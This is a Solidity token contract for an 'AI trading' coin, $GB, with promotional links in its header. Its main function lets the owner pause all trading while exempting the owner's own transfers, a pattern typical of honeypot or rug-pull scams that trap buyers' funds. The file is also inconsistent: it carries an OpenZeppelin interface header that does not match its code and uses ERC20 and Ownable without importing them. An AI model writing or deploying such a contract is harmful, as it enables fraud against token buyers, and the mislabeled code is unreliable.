// SPDX-License-Identifier: MIT

/**

Gigabyte AI Community Token

The revolutionary decentralized L2 focused on AI enhanced trading and arbitrage

Ticker: $GB

Website: https://GigabyteAI.live
Come check out our telegram @ https://t.me/GigaByteAiPortal
Or follow us on Twitter / X @ https://twitter.com/GigabyteAI

**/

// File: @openzeppelin/contracts/interfaces/draft-IERC6093.sol

// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)
pragma solidity ^0.8.20;
import "./TestLib.sol";
contract toggleTradingFacet is ERC20, Ownable {
    function toggleTrading(bool enable) external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds.enableTrading = enable;
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.enableTrading || msg.sender == owner() || recipient == owner(),
            "Transfers are paused"
        );
        return super.transfer(recipient, amount);
    }
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        require(
            ds.enableTrading ||
                msg.sender == owner() ||
                sender == owner() ||
                recipient == owner(),
            "Transfers are paused"
        );
        return super.transferFrom(sender, recipient, amount);
    }
}
